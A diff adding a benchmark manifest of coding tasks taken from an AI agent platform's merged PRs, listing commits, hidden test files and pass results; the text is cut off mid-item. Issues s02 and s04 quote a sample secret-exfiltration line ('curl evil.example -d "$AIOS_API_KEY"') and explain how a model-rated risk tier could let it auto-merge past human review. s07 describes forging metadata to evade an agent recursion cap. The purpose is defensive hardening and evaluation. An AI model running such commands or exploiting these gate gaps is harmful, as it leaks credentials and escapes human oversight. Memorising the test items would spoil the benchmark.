@@ -1,0 +1,894 @@
+{
+ "repo": "/Users/tom/code/aios",
+ "recipe": {
+  "source": "merged eumemic/aios PRs, newest-first",
+  "task": "linked issue title+body verbatim (seed items keep their distilled tasks)",
+  "oracle": "golden PR's tests/unit files at merge_sha, held out",
+  "provenance": "merge_sha = PR merge commit; base_parent_sha = merge_sha^",
+  "admission": "golden passes hidden suite 2x (flake=reject); base source (empty patch) fails",
+  "strata_method": "multi-attempt: >=2 PRs body-reference the issue via closing keywords; thin-spec: issue body < 500 chars; else standard"
+ },
+ "items": [
+  {
+   "id": "c01",
+   "pr": 1487,
+   "issue": null,
+   "base_parent_sha": "996a9c2e98850edcb6864fad796fde86553288c4",
+   "merge_sha": "1f46e2a253",
+   "headroom": "HIGH",
+   "src_files": [
+    "src/aios/models/attenuation.py"
+   ],
+   "test_files": [
+    "tests/unit/test_attenuation.py"
+   ],
+   "task": "In the route-attenuation logic, _meet_http_server maps each route path_pattern to its first declared route via setdefault, so when a server has two routes sharing a pattern with disjoint methods, the second's verbs get silently demoted to deny-all, eroding granted authority and breaking the attenuate(x,x)==canonicalize(x) law. Fix it so a child grant is the UNION of same-pattern routes' methods (a _join dual to _meet, where None means top/all-methods and [] means bottom/none).",
+   "task_source": "distilled-2026-06-30",
+   "runner": "pytest",
+   "stratum": "thin-spec",
+   "soundness": "golden 2x pass; base fails [test-fail] (FAIL (3 failed, 100 passed in 0.60s))"
+  },
+  {
+   "id": "c05",
+   "pr": 1332,
+   "issue": 1323,
+   "base_parent_sha": "9d9a873cda559b621e41ff8ec3264ab56b912762",
+   "merge_sha": "b5e6b0c9a5",
+   "headroom": "HIGH",
+   "src_files": [
+    "src/aios/workflows/gh_body.py"
+   ],
+   "test_files": [
+    "tests/unit/test_gh_body_helper.py"
+   ],
+   "task": "gh_paginated follows Link: rel=\"next\" but on hitting max_pages with a next page still dangling, it returns the partial list as if complete (a silent list under-count, e.g. reporting 'all checks green' off page 1). Fix: raise a distinct cannot-determine error ONLY on the ceiling-with-dangling-next case, still returning cleanly on a complete walk.",
+   "task_source": "distilled-2026-06-30",
+   "runner": "pytest",
+   "stratum": "standard",
+   "soundness": "golden 2x pass; base fails [test-fail] (FAIL (6 failed, 11 passed in 0.54s))"
+  },
+  {
+   "id": "c06",
+   "pr": 1479,
+   "issue": 1355,
+   "base_parent_sha": "3acfcf80f3fd6ebb0346693cef75f17a7a69fedd",
+   "merge_sha": "74e5bd8879",
+   "headroom": "HIGH",
+   "src_files": [
+    "src/aios/harness/loop.py"
+   ],
+   "test_files": [
+    "tests/unit/test_loop_retry.py"
+   ],
+   "task": "At the litellm boundary, a generic 'except Exception' routes EVERY failure into the [2,8,30,120]s backoff ladder, including terminal errors (400/context-exceeded/content-policy/401/403/404/422) that retry can never fix, burning ~160s and up to 4 doomed billable calls. Add a predicate for terminal litellm classes that routes them straight to the errored-latch, fail-safe so a misclassified transient never skips retries.",
+   "task_source": "distilled-2026-06-30",
+   "runner": "pytest",
+   "stratum": "standard",
+   "soundness": "golden 2x pass; base fails [env-broke-at-base (collection/import)] (ENV-SKIP (1 error in 1.31s))"
+  },
+  {
+   "id": "c07",
+   "pr": 1397,
+   "issue": 1396,
+   "base_parent_sha": "bd35386d2c7c5d81efdc3502971ef8371e9522c2",
+   "merge_sha": "8286adf082",
+   "headroom": "HIGH",
+   "src_files": [
+    "src/aios/workflows/run_tools.py"
+   ],
+   "test_files": [
+    "tests/unit/test_run_tools.py"
+   ],
+   "task": "The gate-reaper/telemetry dead-men call list_runs/get_run from inside a workflow run, but those are registered session-only, so they always return 'not callable from a workflow run' and both detectors are silent no-ops. Make them run-callable, account-scoped to the calling run's own account (no launching session), with errors-as-values per the run-tool contract.",
+   "task_source": "distilled-2026-06-30",
+   "runner": "pytest",
+   "stratum": "standard",
+   "soundness": "golden 2x pass; base fails [test-fail] (FAIL (6 failed, 14 passed in 0.61s))"
+  },
+  {
+   "id": "c08",
+   "pr": 1571,
+   "issue": 1542,
+   "base_parent_sha": "8a480a26b2db16495a2ff5f22c02e8c080b8e19b",
+   "merge_sha": "6c2d00aabc",
+   "headroom": "HIGH",
+   "src_files": [
+    "src/aios/tools/bash_memory_reconcile.py"
+   ],
+   "test_files": [
+    "tests/unit/test_bash_memory_reconcile.py"
+   ],
+   "task": "_snapshot_with_bytes silently drops any walked memory file whose read_bytes() raises OSError, so an unreadable-but-present file looks absent and the diff treats it as a deletion, wiping durable version history. Fix: keep the path present in both snapshots with a stable content-independent sentinel digest so an unreadable-in-both file compares equal, handled at both the deleted and modified diff loops.",
+   "task_source": "distilled-2026-06-30",
+   "runner": "pytest",
+   "stratum": "standard",
+   "soundness": "golden 2x pass; base fails [test-fail] (FAIL (2 failed, 19 passed in 0.60s))"
+  },
+  {
+   "id": "c12",
+   "pr": 1491,
+   "issue": null,
+   "base_parent_sha": "51da380a762a92d040526d1271323c28033a3643",
+   "merge_sha": "f66e9b54d0",
+   "headroom": "HIGH",
+   "src_files": [
+    "src/aios/harness/image_resize.py"
+   ],
+   "test_files": [
+    "tests/unit/test_image_resize.py"
+   ],
+   "task": "_encode_with_transparency assumes a PNG-saveable/palette-convertible image, but a grayscale+alpha PNG decodes to Pillow mode 'LA', which convert('P', ADAPTIVE) rejects with a bare ValueError; on an oversized such image it escapes the guard and 500s the connector inbound before dedup-ack, causing an infinite poisoned retry loop. Fix: normalize non-canonical transparency modes (e.g. LA) before encode.",
+   "task_source": "distilled-2026-06-30",
+   "runner": "pytest",
+   "stratum": "thin-spec",
+   "soundness": "golden 2x pass; base fails [test-fail] (FAIL (1 failed, 10 passed in 1.79s))"
+  },
+  {
+   "id": "c13",
+   "pr": 1488,
+   "issue": null,
+   "base_parent_sha": "1f46e2a253f00d2e52f7bdb24c4607113db705ed",
+   "merge_sha": "1ca8a773d0",
+   "headroom": "HIGH",
+   "src_files": [
+    "src/aios/models/triggers.py"
+   ],
+   "test_files": [
+    "tests/unit/test_triggers_models.py"
+   ],
+   "task": "_validate_cron_expression rejects grammar-valid crons that have no occurrence within a 1-year horizon, but a valid leap-day cron '0 0 29 2 *' has an 8-year gap across the non-leap century skip (e.g. 2096 to 2104) and is wrongly 422-rejected. Widen the validation horizon to cover the maximum legitimate gap so valid leap-day crons are accepted.",
+   "task_source": "distilled-2026-06-30",
+   "runner": "pytest",
+   "stratum": "thin-spec",
+   "soundness": "golden 2x pass; base fails [test-fail] (FAIL (1 failed, 66 passed in 0.62s))"
+  },
+  {
+   "id": "c16",
+   "pr": 1483,
+   "issue": 1442,
+   "base_parent_sha": "bed4b37fcf28699dd8c016c2d942b093a4dd9518",
+   "merge_sha": "a92f9dbbbb",
+   "headroom": "LOW",
+   "src_files": [
+    "src/aios/harness/loop.py"
+   ],
+   "test_files": [
+    "tests/unit/test_loop_retry.py"
+   ],
+   "task": "Persist provider error detail (exception class + HTTP status + message) on the errored-turn span when retries exhaust and child_errored latches; currently only {is_error:true} is saved. Thread a diagnostic dict through the error-span append.",
+   "task_source": "distilled-2026-06-30",
+   "runner": "pytest",
+   "stratum": "standard",
+   "soundness": "golden 2x pass; base fails [env-broke-at-base (collection/import)] (ENV-SKIP (1 error in 1.23s))"
+  },
+  {
+   "id": "c20",
+   "pr": 1600,
+   "issue": 1564,
+   "base_parent_sha": "0190d8a8e276d9b5b091cb5eb62cf9c09854bc26",
+   "merge_sha": "00e7d03256",
+   "headroom": "LOW",
+   "src_files": [
+    "src/aios/tools/read.py"
+   ],
+   "test_files": [
+    "tests/unit/test_read_handler.py"
+   ],
+   "task": "The read tool inlines sandbox images for vision models but its description (READ_DESCRIPTION and the path param string) only documents text-file behavior, so agents never discover image-inlining. Update the description to document image-inlining, the size cap, and the fallback behavior.",
+   "task_source": "distilled-2026-06-30",
+   "runner": "pytest",
+   "stratum": "standard",
+   "soundness": "golden 2x pass; base fails [test-fail] (FAIL (2 failed, 12 passed in 0.57s))"
+  },
+  {
+   "id": "s01",
+   "pr": 1387,
+   "issue": 1386,
+   "task": "feat(dev-pipeline): standing reaper / gate dead-man \u2014 make PR abandonment impossible\n\n## Problem\nAbandonment is possible today: a parked gate with no resume, a DIRTY PR outside any run, or an unchecked best-effort terminal label write leaves a zombie with no owner. The `run_completion` auto-recovery fires only on `status=errored` (crashed runs), NOT on parked/DIRTY. The dev-pipeline freeze of 2026-06-18 was caught only by the chairman noticing ~5h later \u2014 no armed alarm. (Source-verified; dogfood-backlog Rank 6.)\n\n## Goal\nA standing reaper as a SEPARATE scheduled workflow that backstops the dev pipeline so nothing is silently abandoned. Its verdict must draw from the live GitHub/run artifacts (an uncorrelated, off-the-run substrate) \u2014 a run that parked cannot un-park itself.\n\n## Spec\n- New aios workflow in its own file, on a cron / `fire_at` trigger (sweep ~every 30\u201360 min).\n- Each sweep, detect and act on:\n  1. Issues labeled `autodev:in-progress` with NO live/active run \u2192 bounded re-drive (re-dispatch) or escalate-with-owner.\n  2. Gates open past a staleness threshold (> N hours) \u2192 ESCALATE to the seat/ops-agent. Do NOT auto-resolve approval gates.\n  3. Open PRs in CONFLICTING/DIRTY state with no driving run \u2192 re-drive into the rebase stage (Issue A) or escalate.\n- Emit a STRUCTURED summary each sweep (found + acted).\n- Bounded re-drive: cap at K attempts, then escalate (no infinite re-dispatch).\n\n## Out of scope\nChanging in-run logic (Issue A adds the rebase capability; this is the external backstop). The dispatch trigger (#75).\n\n## Acceptance\nA parked-and-forgotten run, an in-progress-with-no-run issue, or a DIRTY-no-run PR is detected within one sweep interval and re-driven or escalated \u2014 never silently abandoned.\n\n## ADDED REQUIREMENT (chairman-supervision learning, 2026-06-18)\nWedge-detection MUST classify by CHILD-SESSION liveness, NOT parent-run event-seq flatness. A dev_pipeline run is normally `suspended` with a flat PARENT event-seq for the entire duration of every long child agent call (e.g. a ~28-min ci-fix) \u2014 that is HEALTHY, not wedged. Before re-driving a suspended run the reaper MUST fetch the latest child session (the last `call_started` events `child_session_id`) and confirm it is stale/dead (its `updated_at` not advancing); re-drive ONLY when there is no advancing child session. Re-driving on parent-flatness alone KILLS healthy long-running work (the seat did exactly this by hand on a false stall alarm, 2026-06-18). The same signal cleanly separates: real wedge (suspended + no advancing child) vs healthy long agent call (suspended + child advancing) vs gate-park (suspended + last event is a `gate` capability \u2014 leave for review, do not re-drive).",
+   "task_source": "issue-title+body-verbatim",
+   "base_parent_sha": "d107e5979c704d64b9ea39dda257ad32e6cca386",
+   "merge_sha": "2b1cf6cc94a209fe200c33d595ba42112c69df6b",
+   "src_files": [
+    "src/aios/workflows/gate_reaper.py"
+   ],
+   "test_files": [
+    "tests/unit/test_gate_reaper_surface.py"
+   ],
+   "headroom": "UNKNOWN",
+   "stratum": "standard",
+   "runner": "pytest",
+   "soundness": "golden 2x pass; base fails [test-fail] (candidate omitted ['src/aios/workflows/gate_reaper.py'])"
+  },
+  {
+   "id": "s02",
+   "pr": 1191,
+   "issue": 1187,
+   "task": "fix(dev-pipeline): broaden + fail-close the secret-CI risk floor (env-var exfil bypass + fail-open in #1186)\n\n## Context\n#1186 (for #1185) added a deterministic risk floor \u2014 `tier = max(tier, 3)` for PRs touching secret-referencing `.github/workflows` files so they park at the human merge_approval gate. It's a net improvement, but a seat security review (2026-06-16) found two gaps that partially defeat the control:\n\n1. **Env-var exfil bypass.** The floor greps the PR's PATCH for `secrets.`. A malicious step can exfiltrate the keystone secret via the ENV VAR the workflow already injects \u2014 `run: curl evil.example -d \"$AIOS_API_KEY\"` \u2014 with NO literal `secrets.` in the added hunk \u2192 NOT floored \u2192 auto-merges unreviewed. The floor only catches edits whose hunk (incl. ~3 context lines) contains a `secrets.` token.\n2. **Fails OPEN on a files-fetch failure.** `_secret_referencing_workflow_files` returns empty when `GET /pulls/N/files` fails or returns a non-list, so the floor is skipped and the agent's tier (possibly 2 \u2192 auto-merge) stands. The docstring CLAIMS \"a fetch failure can only RAISE the tier toward the conservative side\" \u2014 the code does the opposite. Docstring-vs-code mismatch on a security control.\n\n## Fix\nAdopt #1185's explicitly-endorsed BROADER heuristic + fail-closed:\n- `_secret_referencing_workflow_files` \u2192 flag **ANY** changed `.github/workflows/*.yml|.yaml` file (drop the `secrets.`-in-patch requirement). #1185 endorsed \"ANY diff touching `.github/workflows/` \u2192 floor at tier-3; the false-positive cost is one human gate-clear.\" Simpler AND no bypass. (A tighter alternative \u2014 fetch each workflow's FULL content and floor only those referencing a secret anywhere \u2014 also closes the bypass, but the blanket floor is simpler.)\n- **FAIL CLOSED:** when `GET /pulls/N/files` fails / returns non-list, floor to tier-3 (can't prove safe \u2192 require human review). Fix the docstring to match.\n\n## Acceptance\n- A PR adding an env-var-exfil step (`$AIOS_API_KEY`, no literal `secrets.`) to a `.github/workflows` file is floored \u22653.\n- A files-fetch failure floors to \u22653 (fail closed); docstring matches code.\n- #1186's existing tests still pass; add tests for the env-var case + the fetch-failure (fail-closed) case.\n\nTouches `src/aios/workflows/dev_pipeline.py` (risk node) \u2192 serial dev_pipeline.py queue (conveyor owns).",
+   "task_source": "issue-title+body-verbatim",
+   "base_parent_sha": "3a1387523eeb308c752240563136c0a05f4c143b",
+   "merge_sha": "359a0b0c1e56ed9d769ecdf9a313113c4980c0ab",
+   "src_files": [
+    "src/aios/workflows/dev_pipeline.py"
+   ],
+   "test_files": [
+    "tests/unit/test_dev_pipeline_risk_floor.py"
+   ],
+   "headroom": "UNKNOWN",
+   "stratum": "standard",
+   "runner": "pytest",
+   "soundness": "golden 2x pass; base fails [test-fail] (FAIL (4 failed, 10 passed, 1 error in 0.58s))"
+  },
+  {
+   "id": "s03",
+   "pr": 1190,
+   "issue": 1182,
+   "task": "fix(dev-pipeline): CI-fix loop can't resolve ruff-format-only failures \u2192 false verify-gate park (sentinel + fix agent omit ruff format)\n\n## Problem\nPR #1173 (issue #1156) parked at the **verify gate** after the CI-fix loop exhausted all 3 iterations on a `ruff format --check` failure (`Would reformat: tests/integration/test_wf_dev_pipeline_fixture.py`, `tests/unit/test_http_request.py`). The fix was a single `ruff format` command (done manually in `00c247ee`), yet the pipeline could not self-resolve it. Two compounding gaps:\n\n1. **The CI-fix agent doesn't run `ruff format`.** The GitHub CI `lint` job runs BOTH `ruff check` AND `ruff format --check`. On a format-only failure the `fix_ci` agent evidently runs `ruff check --fix` (or equivalent), which does NOT fix formatting \u2192 the failure persists across all 3 CI-fix iterations \u2192 a false verify-gate park on a trivially-fixable issue.\n2. **The merge sentinel omits `ruff format --check`.** `MERGE_SENTINELS` runs `ruff check src tests` but not `ruff format --check`, so the merge-guard's lint is WEAKER than CI's lint job \u2014 a format-only-broken PR passes the guard (still blocked by branch protection, but the guard's signal is misleadingly clean).\n\n## Fix\n- The CI-fix path must run `ruff format` (not only `ruff check --fix`) when resolving lint failures \u2014 update the `fix_ci` agent prompt / task so format-only failures are auto-fixable.\n- Add `ruff format --check <same targets>` to `MERGE_SENTINELS` so the merge-guard lint matches the CI lint job exactly (one source of lint truth).\n\n## Acceptance\n- A PR failing only `ruff format --check` is auto-fixed by the CI-fix loop (it runs `ruff format`) and never parks at the verify gate.\n- The merge sentinel's lint step matches the CI lint job (both `ruff check` and `ruff format --check`).\n\nEvidence: run `wfr_01KV6TNEE0M076B2YW037XH7PG` (issue #1156) parked at verify gate seq 26; CI lint log `Would reformat: \u2026`; manual fix commit `00c247ee`.",
+   "task_source": "issue-title+body-verbatim",
+   "base_parent_sha": "538f47738ecca062552cfd3161133b13fe7124a1",
+   "merge_sha": "3a1387523eeb308c752240563136c0a05f4c143b",
+   "src_files": [
+    "src/aios/workflows/dev_pipeline.py"
+   ],
+   "test_files": [
+    "tests/unit/test_dev_pipeline_ruff_format.py"
+   ],
+   "headroom": "UNKNOWN",
+   "stratum": "standard",
+   "runner": "pytest",
+   "soundness": "golden 2x pass; base fails [test-fail] (FAIL (4 failed, 3 passed in 0.59s))"
+  },
+  {
+   "id": "s04",
+   "pr": 1186,
+   "issue": 1185,
+   "task": "fix(dev-pipeline): floor risk tier at 3 for secret-referencing .github/workflows changes (CI changes can exfiltrate a provisioned secret)\n\n## Problem\nThe risk node rated #1184 (a change to `.github/workflows/reregister-dev-pipeline.yml`, which references `${{ secrets.AIOS_API_KEY }}`) as **tier-2 \u2192 auto-merged**. That was correct *while the Action is dormant* (no secret provisioned), and the rationale said so. But it exposes a control gap: a change to a secret-referencing CI workflow is a privileged-surface change \u2014 it runs on `push: master` with the secret and the `GITHUB_TOKEN` in scope, outside the app's own auth. A malicious or buggy step (`run: curl evil.com -d \"$AIOS_API_KEY\"`) added to such a workflow would **exfiltrate the secret on the next master push**, and tier-2 auto-merge ships it with NO human gate \u2014 defeating the merge_approval control for a credential-class change.\n\nThis is the **precondition for safely provisioning the keystone's `AIOS_API_KEY` secret** (#1179/#1180): until secret-referencing CI changes are gated to a human, provisioning the secret opens an auto-merge exfiltration path. The keystone activation is being held on this fix.\n\n## Fix\nFloor the risk tier at **3 (human gate)** for any PR whose diff touches a `.github/workflows/*.yml` file that references a secret (`secrets.`). Prefer a **deterministic floor** in the risk node (post-process the agent's tier: if the changed-files set includes a secret-referencing workflow, `tier = max(tier, 3)`) over relying on the risk agent's judgment \u2014 a security control should not depend on an LLM noticing. The risk node already has the PR; it can fetch the changed files + grep for `secrets.`.\n\nConservative heuristic acceptable: ANY diff touching `.github/workflows/` \u2192 floor at tier-3 (CI/CD config is privileged regardless; the false-positive cost is one human gate-clear).\n\n## Acceptance\n- A PR modifying a secret-referencing `.github/workflows/*.yml` is rated tier \u22653 and parks at the merge_approval gate (never auto-merges).\n- A PR touching only non-CI files (or non-secret workflows, if the narrower heuristic is chosen) is unaffected.\n- A unit test pins the floor (a fixture diff touching a secret-referencing workflow \u2192 tier \u22653).\n\nContext: surfaced by #1184 auto-merging at tier-2 (correct while dormant) while gating the decision to provision the keystone secret. This is a dev_pipeline.py risk-node change \u2192 serial dev_pipeline.py queue; dispatch it FIRST (ahead of #1182/#1178) since it unblocks keystone activation.",
+   "task_source": "issue-title+body-verbatim",
+   "base_parent_sha": "da7fbaeb848ea261139fbf0c5a155a8488b159fa",
+   "merge_sha": "190c925e6c7f28dd9e735f9e691a44ec2944af30",
+   "src_files": [
+    "src/aios/workflows/dev_pipeline.py"
+   ],
+   "test_files": [
+    "tests/unit/test_dev_pipeline_risk_floor.py"
+   ],
+   "headroom": "UNKNOWN",
+   "stratum": "standard",
+   "runner": "pytest",
+   "soundness": "golden 2x pass; base fails [test-fail] (FAIL (12 errors in 0.11s))"
+  },
+  {
+   "id": "s05",
+   "pr": 1145,
+   "issue": 1135,
+   "task": "dev_pipeline.py: export the required tool + http_server surface, not just the script (#1068 deploy gap)\n\n## Gap\n\n`build_dev_pipeline_script(...)` (the #1068 builder) returns only the workflow **script string**. But a deployed workflow ALSO needs its tool + http_server surface declared on the `WorkflowCreate`, or every `tool()` call errors at runtime:\n\n```\n{\"error\": \"tool 'bash' is not in the workflow's declared tools\"}   # run_tools.py:137\n```\n\nThe dev-pipeline script uses `tool('bash')` and `tool('http_request')`, and requires the `github` http_server with **two** routes (`/repos/**` GET\u00b7POST\u00b7PUT and a separate `/graphql` POST). None of that ships with the script \u2014 a deployer must *know* to hand-add `tools:[{type:\"bash\"},{type:\"http_request\"}]` and the two-route `github` http_server to the POST body. Undocumented and drift-prone.\n\n## Fix\n\nExport the full deploy surface alongside the script. Either:\n- constants `REQUIRED_TOOLS` + `REQUIRED_HTTP_SERVERS` (the two-route github spec), or\n- a `build_dev_pipeline_workflow_create(...)` helper returning the complete `WorkflowCreate` payload (script + tools + http_servers) so the surface can't drift from the script that needs it.\n\n## Provenance\n\nSurfaced 2026-06-14 by the #1068 Phase-1 deploy dogfood \u2014 would have failed the very first `tool()` call had the deployer not caught it from source. Relates #1068; blocks a clean live deploy of that PR.",
+   "task_source": "issue-title+body-verbatim",
+   "base_parent_sha": "210eab7fc6ef63c813909207a16cbcf23dceb616",
+   "merge_sha": "1a7b2ba4045bb3326a663a7ab1c3ffc18b742989",
+   "src_files": [
+    "src/aios/workflows/dev_pipeline.py"
+   ],
+   "test_files": [
+    "tests/unit/test_dev_pipeline_surface.py"
+   ],
+   "headroom": "UNKNOWN",
+   "stratum": "standard",
+   "runner": "pytest",
+   "soundness": "golden 2x pass; base fails [env-broke-at-base (collection/import)] (ENV-SKIP (1 error in 0.09s))"
+  },
+  {
+   "id": "s06",
+   "pr": 1144,
+   "issue": 1139,
+   "task": "dev_pipeline.py _is_transient() retries deterministic broker/route errors (3\u00d7 wasted retries)\n\nFrom the #1068 dogfood: `dev_pipeline.py:_is_transient()` classifies ANY `{\"error\":...}` tool result as transient \u2192 retries 3\u00d7. But a broker **route-allowlist rejection** (\"does not match any enabled route\") is **deterministic** (a 405-equivalent), never transient \u2014 so the pipeline burns 3 pointless retries on every such call (observed on the success-path DELETE label-cleanup, which is also missing from the route allowlist \u2014 companion fix in #1135). The same gap hits the `_fail` path.\n\nFix: `_is_transient` must treat broker route-mismatch / method-not-allowed / auth-denied as **terminal** (no retry), reserving retry for genuine transients (5xx, timeouts, connection resets). Relates #1068. Provenance: dogfood 2026-06-14.",
+   "task_source": "issue-title+body-verbatim",
+   "base_parent_sha": "d97f8869e01660bd1b73c2ae8e378cb17087cbef",
+   "merge_sha": "210eab7fc6ef63c813909207a16cbcf23dceb616",
+   "src_files": [
+    "src/aios/workflows/dev_pipeline.py"
+   ],
+   "test_files": [
+    "tests/unit/test_dev_pipeline_retry.py"
+   ],
+   "headroom": "UNKNOWN",
+   "stratum": "standard",
+   "runner": "pytest",
+   "soundness": "golden 2x pass; base fails [test-fail] (FAIL (4 failed, 6 passed in 0.54s))"
+  },
+  {
+   "id": "s07",
+   "pr": 1141,
+   "issue": 1083,
+   "task": "Forgeable wake-depth/wake_source metadata: the recursion cap trusts caller-supplied keys on user messages\n\n## Symptom\n\nThe wake-depth recursion cap trusts **caller-supplied** metadata. `tools/wake_session.py:122` reads `wake_depth` / `wake_source_session_id` off the most-recent `role='user'` message **with no origin filter**. The trusted values are *supposed* to be stamped by the system writer (`wake_session.py:282`), but:\n\n- the **operator POST** path (`api/routers/sessions.py:433`, `post_message`) passes `body.metadata` through **unstripped** \u2014 only `channel` is validated; and\n- the **connector** path (`services/inbound.py:44`, `_RESERVED_METADATA_KEYS`) has a denylist, but it is a per-site convention, not a structural guarantee.\n\n`data.metadata` is `dict[str, Any]` (JSONB) at every write site, with 8+ independent writers.\n\n## Why it matters\n\nA caller who can post a user message with forged `metadata.wake_depth` / `wake_source_session_id` can spoof or evade the wake-depth recursion cap (the mechanism that bounds agent self-/cross-wake recursion). Security-adjacent: the cap is a runaway/abuse bound.\n\n## Reachability\n\nReachable today via the operator POST path: caller-controlled `metadata` lands directly in the trusted slot the cap reads, no strip. (Found while proving reachability for a kaikaku correctness candidate \u2014 see note.)\n\n## Suggested repro + root-cause direction\n\n- **Red test:** post a user message with forged `metadata.wake_depth = 0` (or a forged `wake_source_session_id`) and assert the cap still computes true depth / rejects the evasion.\n- **Root cause:** the cap should read wake provenance from a **trusted origin** (the system-stamped wake lineage), not from arbitrary most-recent-user-message metadata. Reading provenance off any user message with no origin filter is the bug.\n\n## Note on framing\n\nSurfaced by a `/kaikaku` correctness recon as a \"forgeable system-trusted metadata\" defect-class. The *structural* foreclosure (namespace-separate caller metadata from the system-owned slot) **failed** the anti-guard test \u2014 it is a per-site convention across 8+ `dict[str,Any]` writers, so a 9th ingestion path re-introduces it while passing CI. Per the dispatch boundary, the **reachable instance** is filed here as a bug (root-cause fix at the cap's provenance read); the broad namespace re-architecture is *not* a clean correct-by-construction win and is intentionally not proposed.",
+   "task_source": "issue-title+body-verbatim",
+   "base_parent_sha": "062c7154a185e499e3d5ff6308d6fd4a8d8b155c",
+   "merge_sha": "7b7fd3a88d797678d8a372ca160cee233a8ec214",
+   "src_files": [
+    "src/aios/tools/wake_session.py"
+   ],
+   "test_files": [
+    "tests/unit/test_wake_session_handler.py"
+   ],
+   "headroom": "UNKNOWN",
+   "stratum": "standard",
+   "runner": "pytest",
+   "soundness": "golden 2x pass; base fails [test-fail] (FAIL (5 failed, 9 passed in 0.59s))"
+  },
+  {
+   "id": "s09",
+   "pr": 1108,
+   "issue": 984,
+   "task": "DNAT lockdown hardening: nat-table flush idempotency + post-apply DNAT coverage verification (companions to #978)\n\n## Two deferred-safety findings from PR #977's security review (2026-06-11)\n\nNeither is exploitable (the real secret never enters the container; worst case is placeholder-bearing traffic or stale duplicate rules), but both live in security-chain-of-record code.\n\n### 1. `iptables -F OUTPUT` doesn't flush the nat table\n\n`build_iptables_script` flushes only the filter OUTPUT chain (setup.py:203-area). Today lockdown runs once per fresh netns so no stale rules exist \u2014 but any future re-apply path (e.g. credential rotation triggering a lockdown refresh without full recycle) would accumulate duplicate DNAT entries silently. Add `iptables -t nat -F OUTPUT` alongside the existing flush for idempotency.\n\n### 2. Verify script covers only the filter table \u2014 silent DNAT omission undetected\n\n`_LOCKDOWN_VERIFY_SCRIPT` checks only `-P OUTPUT DROP` on the filter table. If a credential host's `getent` returns zero IPs, the DNAT loop body emits no rule and no error: apply exits 0, verify passes, and the session runs WITHOUT DNAT for that host \u2014 silently (placeholder goes direct upstream; auth failures with no operator signal). When `dnat_hosts` is non-empty, the verify should also assert `iptables -t nat -S OUTPUT | grep -q DNAT` (or per-host coverage).\n\n## Test strategy\n\nUnit: script emission includes the nat flush; verify-script content asserts nat coverage when dnat_hosts present. Integration (sidecar harness, mirrors PR #977's tests): re-apply produces no duplicate rules; a host resolving to zero IPs makes verify fail rather than pass silently.\n\nRelated: #978 (IPv4-only getent \u2014 same robustness family), #885 (host-side enforcement track).\n\n---\n\n**Escalation contract:** If during implementation you hit a design decision this issue body does not settle, do NOT pick an answer and continue. Stop, post an issue comment starting with `ESCALATION:` stating the question, options, and your recommendation, add the `escalated` label \u2014 then exit. An escalated stop is a success mode, not a failure.\n\n\ud83e\udd16 Generated with [Claude Code](https://claude.com/claude-code)",
+   "task_source": "issue-title+body-verbatim",
+   "base_parent_sha": "701f052dd62aea4f1868eca8902a81c3a172e409",
+   "merge_sha": "0aebd6e5f77d12a244f7bbc72f729b937422fd2a",
+   "src_files": [
+    "src/aios/sandbox/setup.py"
+   ],
+   "test_files": [
+    "tests/unit/test_networking.py"
+   ],
+   "headroom": "UNKNOWN",
+   "stratum": "standard",
+   "runner": "pytest",
+   "soundness": "golden 2x pass; base fails [env-broke-at-base (collection/import)] (ENV-SKIP (1 error in 0.18s))"
+  },
+  {
+   "id": "s10",
+   "pr": 1090,
+   "issue": 1080,
+   "task": "Single-source the reaction watermark: delete the duplicate session_max_reacting CTE, join the maintained last_reacted_seq\n\n## Current shape\n\nThe reaction watermark exists in **two** places that must agree:\n\n- `db/queries/events.py:672-735` \u2014 `append_event` maintains the scalar `sessions.last_reacted_seq` (forward `GREATEST` accumulation). The candidate-rows gate consumes it directly (`sweep.py:137-145`, `last_stimulus_seq > last_reacted_seq`).\n- `harness/sweep.py:181-197` \u2014 `UNREACTED_ROWS_SQL` **recomputes the same watermark** via the `session_max_reacting` CTE: `MAX(COALESCE((data->>'reacting_to')::bigint, seq))` over assistant messages, then filters `e.seq > max_reacting`.\n\nThe maintenance comment at `events.py:672-673` admits the coupling is comment-only (\"exactly the pre-#732 `session_max_reacting` CTE\").\n\n## Defect-class + reachability (reachable)\n\nDuplicate-definition drift with a **realized historical precedent**: commit `ef06d5b5` (#750, \"O(1) session-status via maintained scalar columns\") migrated `CANDIDATE_ROWS_SQL` off the CTE onto the maintained scalar **but left the byte-identical CTE in `UNREACTED_ROWS_SQL`** \u2014 the literal partial migration. Future-edit path: any change to reaction semantics (which roles count, the no-`reacting_to` fallback) must land in **three** coordinated places (the `append_event` maintenance, the `0066` backfill, and the sweep CTE) with nothing forcing the third to track. An edit that touches only the maintained pair silently leaves the sweep CTE stale \u2192 `#155`-class wake-no-progress / skipped inference.\n\n## Proposed shape (foreclosure)\n\nDelete the `session_max_reacting` CTE from `UNREACTED_ROWS_SQL`; replace with a JOIN on the maintained scalar:\n\n```sql\nSELECT e.session_id, e.data FROM events e\nJOIN sessions s ON s.id = e.session_id\nWHERE e.session_id = ANY($1::text[])\n  AND e.kind='message' AND e.role <> 'assistant'\n  AND e.seq > s.last_reacted_seq\n```\n\nAfter this the watermark formula no longer exists at the sweep site \u2014 it lives in exactly **one** writable place (`append_event`'s `UPDATE`), seeded once by the `0066` backfill.\n\n## Why this is mistake-proofing, not a guard\n\nPasses the unaware-developer test: reconstituting the split requires *deliberately authoring a fresh CTE* that re-derives `MAX(COALESCE(reacting_to,seq))` \u2014 that is writing new duplicate code, not an unaware edit that merely compiles. Not a \"keep in sync\" comment, not an equality test \u2014 a deletion to a single source.\n\n## Behavior-preservation (verified)\n\nThe `0066` backfill `react_s` CTE is byte-for-byte identical to `session_max_reacting`; forward `GREATEST` maintenance preserves the aggregate; the no-`reacting_to` fallback (`last_event_seq+1` = that assistant's own seq) equals the CTE's `COALESCE`-to-`seq`. The e2e perf guard `tests/e2e/test_sweep_perf.py::test_unreacted_rows_is_not_n_plus_1` still passes (the rewrite removes a `GROUP BY` aggregate for an equality JOIN \u2014 strictly fewer event-log passes).\n\n## Blast / risk\n\nOne SQL block in `sweep.py` + its tests. Reversible. No schema/wire change.\n\n---\n*Surfaced + validated (`survives_as_foreclosure`, both fences clean) by a `/kaikaku` correctness-by-construction recon.*",
+   "task_source": "issue-title+body-verbatim",
+   "base_parent_sha": "fae1f500ce780965af0f13206c298b83a0cfdfa1",
+   "merge_sha": "7bd85a5c09fdba473c3e794cc3a6940e913fd7a0",
+   "src_files": [
+    "src/aios/harness/sweep.py"
+   ],
+   "test_files": [
+    "tests/unit/test_unreacted_rows_single_source.py"
+   ],
+   "headroom": "UNKNOWN",
